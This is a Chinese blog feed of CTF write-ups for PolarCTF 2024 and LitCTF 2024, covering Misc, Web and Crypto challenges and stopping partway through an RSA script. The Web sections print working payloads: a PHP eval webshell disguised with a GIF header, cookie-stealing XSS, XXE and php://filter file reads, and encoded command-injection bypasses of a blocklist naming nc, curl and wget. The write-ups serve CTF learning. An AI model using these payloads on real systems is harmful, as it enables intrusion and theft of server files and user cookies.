    <content type="html"><![CDATA[<p>前言:比赛并没有参加，趁着复习期末写题目放松一会，学习学习知识。</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h2><p>典型的一句话木马，按照流程来就行</p><p>直接上传一个图片，不能直接连接成功，试着传入htaccess限定只能上传图片那些，那估计就是改图片为php就行</p><p><img src="/../../images/polarctf2024%E5%A4%8F/upload.png" alt="upload"></p><p>然后蚁剑连一下就可以了</p><p><img src="/../../images/polarctf2024%E5%A4%8F/upload1.png" alt="upload1"></p><p>疑惑：我尝试用jpg上传的时候改末尾并不能成功，看官p用的gif，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<br>&lt;script language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;attack&#x27;</span>]);&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>按道理也应该正常执行的，并不是很理解。</p><h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">no no no! &lt;?php<br>error_reporting(0);<br>include(&quot;flag.php&quot;);<br>highlight_file(__FILE__);<br><br>if (isset($_GET[&#x27;xxs&#x27;])) &#123;<br>    $input = $_GET[&#x27;xxs&#x27;];<br><br>    if (is_array($input)) &#123;<br>        die(&quot;错误：输入类型不允许为数组。&quot;);<br>    &#125;<br>    if (!preg_match(&quot;/^0e[0-9]+$/&quot;, md5($input))) &#123;<br>        die(&quot;错误：输入的MD5值必须以&#x27;0e&#x27;开头，并跟随数字。&quot;);<br>    &#125;<br>    if (!is_numeric($input)) &#123;<br>        die(&quot;错误：输入必须是数字。&quot;);<br>    &#125;<br><br>    die(&quot;恭喜：&quot;.$flag);<br>&#125; else &#123;<br>    die(&quot;错误：必须设置正确参数。&quot;);<br>&#125;<br>?&gt;<br>错误：必须设置正确参数。<br></code></pre></td></tr></table></figure><p>先上源码，先审计一下代码，大体上应该就是关于md5的知识点</p><p>首先不能用数组绕过，然后要0e开头，最后md5加密后不能为数字，直接一把梭了，平时积累的md5加密等于自身就行</p><p><img src="/../../images/polarctf2024%E5%A4%8F/%E5%AE%A1%E8%AE%A1.png" alt="审计"></p><h2 id="扫扫看"><a href="#扫扫看" class="headerlink" title="扫扫看"></a>扫扫看</h2><p>提醒我们扫一下，用dirsearch扫一下得到flag.php,进去看看</p><p><img src="/../../images/polarctf2024%E5%A4%8F/%E6%89%AB.png" alt="扫"></p><p>看一下源码,得到flag</p><p><img src="/../../images/polarctf2024%E5%A4%8F/%E6%89%AB1.png" alt="扫1"></p><h2 id="debudao"><a href="#debudao" class="headerlink" title="debudao"></a>debudao</h2><p>内容，先看看源码，有个flag是假的（欸</p><p>尝试sql注入，好像也不是</p><p>尝试ssit注入，也不是</p><p>最后发现是xxe漏洞，这方面我还没怎么学，等暑假好好补补吧</p><p>先用下面的来测试一下，发现有弹窗</p><p><img src="/../../images/polarctf2024%E5%A4%8F/debudao.png" alt="debudao"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script&gt;alert(1)&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>然后跟着wp写的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="/../../images/polarctf2024%E5%A4%8F/%E5%BE%97%E4%B8%8D%E5%88%B01.png" alt="得不到1"></p><p>爆出flag，用url解码就可以得到flag了</p><p>想法：按照这个方法的话其实好像可以直接用hackerbar看cookie那一栏，并不需要构造xxe，重新开一次容器发现方法并不可行，哈哈我自己想多了</p><h2 id="Dragon"><a href="#Dragon" class="headerlink" title="Dragon"></a>Dragon</h2><p>按照正常思路来走一遍，和上面的差不多但是都没有回显，最后得出也是xxe</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>也是用这个得到的但是不能正常弹窗，和官p学习了一下可以用img</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;img src=0 onerror =alert(1)&gt;<br></code></pre></td></tr></table></figure><p>这样就可以正常的弹窗了，然后和上面的题目一样</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;img src=0 onerror =alert(document.cookie)&gt;<br></code></pre></td></tr></table></figure><p>获取cookie值，url解码得到flag</p><p>感想:任何比赛都能让人找到自己的不足漏洞，之后一定要狠狠学学。</p><h2 id="tnl"><a href="#tnl" class="headerlink" title="tnl"></a>tnl</h2><p>类型和前几题差不多，也试看看，尝试输入到3的时候会有报错，以为是sql注入，尝试万能语句并没有作用</p><p>也尝试了一下xxe也没有回显</p><p>用bp抓包看看，尝试利用伪协议得到index.php</p><p><img src="/../../images/polarctf2024%E5%A4%8F/tnl.png" alt="tnl"></p><p>这是尝试过后发现源码应该后面本身就包含了.php，得到了源码，base64解密一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;/form&gt;<br>&lt;?php<br>error_reporting(0);<br>@$file = $_POST[&#x27;twothree&#x27;];<br><br>if(isset($file))<br>&#123;<br>if( strpos( $file, &quot;1&quot; ) !==  false || strpos( $file, &quot;2&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;<br>include ($file . &#x27;.php&#x27;);<br>&#125;<br>else&#123;<br>echo &quot;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;twothree&#x27;&#x27; at line 1&quot;;<br>&#125;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>看了源码可以得知这并不是sql注入，而是一个伪协议绕过的题目，输入1，2，index可以获得相应的内容</p><p>那么进行简单的构造，我也是第一次看到这种</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">twothree=php://filter/convert.base64-encode/index/resource=flag<br></code></pre></td></tr></table></figure><p><img src="/../../images/polarctf2024%E5%A4%8F/tnl1.png" alt="tnl1"></p><p>最后base64解密就可以得到flag了</p><h2 id="你知道sys还能这样玩吗"><a href="#你知道sys还能这样玩吗" class="headerlink" title="你知道sys还能这样玩吗"></a>你知道sys还能这样玩吗</h2><p>根据提示进入sys.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget/i&#x27;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>和国赛的那个有点类似</p><h3 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h3><p>尝试php -r来进行二次执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd=php -r <span class="hljs-string">&#x27;system(hex2bin(&quot;6c73202e2e2f&quot;));&#x27;</span><br></code></pre></td></tr></table></figure><p>查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd=php -r <span class="hljs-string">&#x27;system(hex2bin(ff3b636174202f666c61672e747874));&#x27;</span><br></code></pre></td></tr></table></figure><p>ff是进行的一个绕过执行，否则得不到</p><h3 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd=`<span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;Y2F0IC8q&quot;</span>|bas<span class="hljs-string">&quot;&quot;</span>e64 -d`<br></code></pre></td></tr></table></figure><p>这里看到一个师傅利用了printf和双引号绕过base64加密的方法得到了答案，也放在这，还是比较巧妙的</p><h3 id="方法3："><a href="#方法3：" class="headerlink" title="方法3："></a>方法3：</h3><p>上面几个都是借鉴的，还有一个办法就是八进制转化，之前写xyctf有一个和这样类似的，我就直接上payload了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd=$%27\143\141\164%27%3c$%27\57\146\154\141\147\56\164\170\164%27<br></code></pre></td></tr></table></figure><p>详情可参考，<a href="https://0ran9ewww.github.io/2024/04/26/XYCTFwp%E5%8F%8A%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%9B%98/">文章</a>，ezrce那个部分</p><h2 id="ExX"><a href="#ExX" class="headerlink" title="ExX?"></a>ExX?</h2><p>先搜看看flag{}有个假的flag，那再看看题目吧</p><p>尝试dirsearch扫描得到dom.php,出现了xml的报错很明显就是xxe的漏洞了，同天的lit比赛也是有一个题目是xxe</p><p>不知道原理直接上payload之后打算写一篇专题好好学习</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">foo</span> <span class="hljs-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///var/www/html/flagggg.php&quot;</span> &gt;</span>]&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>最后base64解密就行</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>剩下的题目都是考察java类的web题目，我还没学到也暂时没必要跟着复现了，总体来说题目也是较为友好的，自己还是要多复习多刷题，暂时就先到这了。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>xxe</tag>
      
      <tag>命令执行</tag>
      
      <tag>伪协议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Litctf2024</title>
    <link href="/2024/06/01/litctf2024/"/>
    <url>/2024/06/01/litctf2024/</url>
    
    <content type="html"><![CDATA[<p>前言：抽空写了一下挺适合新生的，但是复现环境一直没上，把中途写了的先放上面，如果后期上环境会写一下，要不然就咕了吧。</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="涐贪恋和伱、甾―⑺de毎兮毎秒"><a href="#涐贪恋和伱、甾―⑺de毎兮毎秒" class="headerlink" title="涐贪恋和伱、甾―⑺dé毎兮毎秒"></a>涐贪恋和伱、甾―⑺dé毎兮毎秒</h2><p>下载图片，尝试改宽高，binwalk无果，steg看看，调成000就出来了</p><p><img src="/../images/litctf2024/%E6%AF%8F%E5%88%86%E6%AF%8F%E7%A7%92.png" alt="每分每秒"></p><h2 id="你说得对，但"><a href="#你说得对，但" class="headerlink" title="你说得对，但__"></a>你说得对，但__</h2><p>下载扫一下，进入云原神，foremost得到四张图拼一下得到二维码</p><p>在word里面就可以</p><p><img src="/../images/litctf2024/%E4%BD%86%E6%98%AF.png" alt="但是"></p><p>扫一下得到flag</p><h2 id="原铁，启动！"><a href="#原铁，启动！" class="headerlink" title="原铁，启动！"></a>原铁，启动！</h2><p>类似flag的特殊文字，以前写过类似的</p><p>放图片对照</p><p><img src="/../images/litctf2024/%E5%8E%9F%E7%A5%9E.jpeg" alt="原神"></p><p><img src="/../images/litctf2024/%E5%B4%A9%E9%93%81.png" alt="崩铁"></p><p>flag{good_gamer}</p><h2 id="盯帧珍珠"><a href="#盯帧珍珠" class="headerlink" title="盯帧珍珠"></a>盯帧珍珠</h2><p>010看一下是gif改一下，写个脚本出截图</p><img src="/../images/litctf2024/frame_7.png" alt="frame_7" style="zoom:25%;"><img src="/../images/litctf2024/frame_21.png" alt="frame_21" style="zoom:25%;"><img src="/../images/litctf2024/frame_31.png" alt="frame_31" style="zoom:25%;"><img src="/../images/litctf2024/frame_55.png" alt="frame_55" style="zoom:25%;"><h2 id="Everywhere-We-Go"><a href="#Everywhere-We-Go" class="headerlink" title="Everywhere We Go"></a>Everywhere We Go</h2><p>下载得到MP3</p><p>用aud看一下找到flag</p><p><img src="/../images/litctf2024/where.png" alt="where"></p><h2 id="舔到最后应有尽有"><a href="#舔到最后应有尽有" class="headerlink" title="舔到最后应有尽有"></a>舔到最后应有尽有</h2><p>密文，看着眼熟一把梭</p><p><img src="/../images/litctf2024/%E8%88%94.png" alt="舔"></p><h2 id="关键，太关键了"><a href="#关键，太关键了" class="headerlink" title="关键，太关键了!"></a>关键，太关键了!</h2><p>jetnta{e_kess_ymu_imss}</p><p>猜测前面对应的是litctf，后面估计就是i_miss_you_什么,写个代码看出现词频</p><p>得到为b，最后为boss</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="SAS-Serializing-Authentication-System"><a href="#SAS-Serializing-Authentication-System" class="headerlink" title="SAS - Serializing Authentication System"></a>SAS - Serializing Authentication System</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;secure_password&#x27;</span>);<br><br><span class="hljs-comment">// 序列化并编码对象</span><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><br></code></pre></td></tr></table></figure><p>Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjE1OiJzZWN1cmVfcGFzc3dvcmQiO30&#x3D;</p><p>得到答案</p><h2 id="exx"><a href="#exx" class="headerlink" title="exx"></a>exx</h2><p>xxe构造，bp发包</p><p><img src="/../images/litctf2024/exx.png" alt="exx"></p><h2 id="一个…-池子？"><a href="#一个…-池子？" class="headerlink" title="一个….池子？"></a>一个….池子？</h2><p>测试为ssit,fenjing一把梭</p><p><img src="/../images/litctf2024/%E6%B1%A0%E5%AD%90.png" alt="池子"></p><h2 id="浏览器也能套娃？"><a href="#浏览器也能套娃？" class="headerlink" title="浏览器也能套娃？"></a>浏览器也能套娃？</h2><p>这题的话考察的是ssrf，这方面类型的题目之前没写过，相关的知识点也不太清楚。</p><p>先随机尝试看看</p><p><img src="/../images/litctf2024/%E5%A5%971.png" alt="套1"></p><p>正常输入网站是可以的，尝试输入其他的看看</p><p><img src="/../images/litctf2024/%E5%A5%972.png" alt="套2"></p><p>明显是ssrf，尝试绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">file:///flag<br></code></pre></td></tr></table></figure><p>或者用伪协议绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php://filter/resource=/flag<br></code></pre></td></tr></table></figure><p>得到flag</p><h2 id="高亮主题-划掉-背景查看器"><a href="#高亮主题-划掉-背景查看器" class="headerlink" title="高亮主题(划掉)背景查看器"></a>高亮主题(划掉)背景查看器</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// 文件包含漏洞演示</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123;<br><br>    <span class="hljs-comment">// 读取并包含用户输入的文件</span><br><br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">&#x27;..&#x27;</span>) === <span class="hljs-literal">false</span>) &#123;<br><br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>;<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Access denied.&quot;</span>;<br><br>    &#125;<br><br>&#125; <span class="hljs-keyword">else</span> &#123;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;No file specified.&quot;</span>;<br><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>看着像文件包含啊，匹配是否有..，试了一会没出，抓个包看看</p><p><img src="/../images/litctf2024/%E8%83%8C%E6%99%AF.png" alt="背景"></p><p>给theme输入flag,会有报错回显，那估计就是通过这个来具体在那一层需要挨个试</p><p><img src="/../images/litctf2024/%E8%83%8C%E6%99%AF1.png" alt="背景1"></p><p>得到flag</p><h2 id="百万美元的诱惑"><a href="#百万美元的诱惑" class="headerlink" title="百万美元的诱惑"></a>百万美元的诱惑</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> !== <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$c</span>) &amp;&amp; <span class="hljs-variable">$c</span> &gt; <span class="hljs-number">2024</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;好康的&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;干巴爹干巴爹先辈~&quot;</span>);<br>        &#125;<br>    &#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;开胃小菜))&quot;</span>);<br>&#125;<br>开胃小菜))<br></code></pre></td></tr></table></figure><p>简单的分析一下传三个值，a和b是个很常规的MD5弱比教，c是利用php的特性就可以绕过</p><p><strong>方法1</strong>：数组绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?a[]=1&amp;b[]=2&amp;c=2025a<br></code></pre></td></tr></table></figure><p><strong>方法2</strong>：积累字符串</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?a=s878926199a&amp;b=s155964671a&amp;c=2025a<br></code></pre></td></tr></table></figure><p>跳到第二页面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag in 12.php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;x&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$x</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;x&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z0-9;`|#&#x27;\&quot;%&amp;\x09\x0a&gt;&lt;.,?*\-=\\[\]]/i&quot;</span>, <span class="hljs-variable">$x</span>))&#123;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat &quot;</span>.<span class="hljs-variable">$x</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>很常见的无字母数字绕过，只要构造12就可以了</p><p>我尝试了异或和自反失败了，应该用的是linux的特性构造自增</p><p>可以看看这篇文章，好多题这篇都可以解决</p><p><a href="https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc+EvPQT47qgxAxAIwxx&alichlgref=https://cn.bing.com/#toc-0">文章</a>，按照图片然后往后加就行</p><p><img src="/../images/litctf2024/dollar.png" alt="dollar"></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))<br></code></pre></td></tr></table></figure><p>最后看一下源码得到flag</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="small-e"><a href="#small-e" class="headerlink" title="small_e"></a>small_e</h2><p>gpt一把梭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>n = <span class="hljs-number">19041138093915757361446596917618836424321232810490087445558083446664894622882726613154205435993358657711781275735559409274819618824173042980556986038895407758062549819608054613307399838408867855623647751322414190174111523595370113664729594420259754806834656490417292174994337683676504327493103018506242963063671315605427867054873507720342850038307517016687659435974562024973531717274759193577450556292821410388268243304996720337394829726453680432751092955575512372582624694709289019402908986429709116441544332327738968785428501665254894444651547623008530708343210644814773933974042816703834571427534684321229977525229</span><br>c_list = [<span class="hljs-number">438976</span>, <span class="hljs-number">1157625</span>, <span class="hljs-number">1560896</span>, <span class="hljs-number">300763</span>, <span class="hljs-number">592704</span>, <span class="hljs-number">343000</span>, <span class="hljs-number">1860867</span>, <span class="hljs-number">1771561</span>, <span class="hljs-number">1367631</span>, <span class="hljs-number">1601613</span>, <span class="hljs-number">857375</span>, <span class="hljs-number">1225043</span>, <span class="hljs-number">1331000</span>, <span class="hljs-number">1367631</span>, <span class="hljs-number">1685159</span>, <span class="hljs-number">857375</span>, <span class="hljs-number">1295029</span>, <span class="hljs-number">857375</span>, <span class="hljs-number">1030301</span>, <span class="hljs-number">1442897</span>, <span class="hljs-number">1601613</span>, <span class="hljs-number">140608</span>, <span class="hljs-number">1259712</span>, <span class="hljs-number">857375</span>, <span class="hljs-number">970299</span>, <span class="hljs-number">1601613</span>, <span class="hljs-number">941192</span>, <span class="hljs-number">132651</span>, <span class="hljs-number">857375</span>, <span class="hljs-number">1481544</span>, <span class="hljs-number">1367631</span>, <span class="hljs-number">1367631</span>, <span class="hljs-number">1560896</span>, <span class="hljs-number">857375</span>, <span class="hljs-number">110592</span>, <span class="hljs-number">1061208</span>, <span class="hljs-number">857375</span>, <span class="hljs-number">1331000</span>, <span class="hljs-number">1953125</span>]<br><br>flag = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> c_list:<br>    m, exact = gmpy2.iroot(c, <span class="hljs-number">3</span>)  <span class="hljs-comment"># 求立方根</span><br>    <span class="hljs-keyword">if</span> exact:<br>        flag += 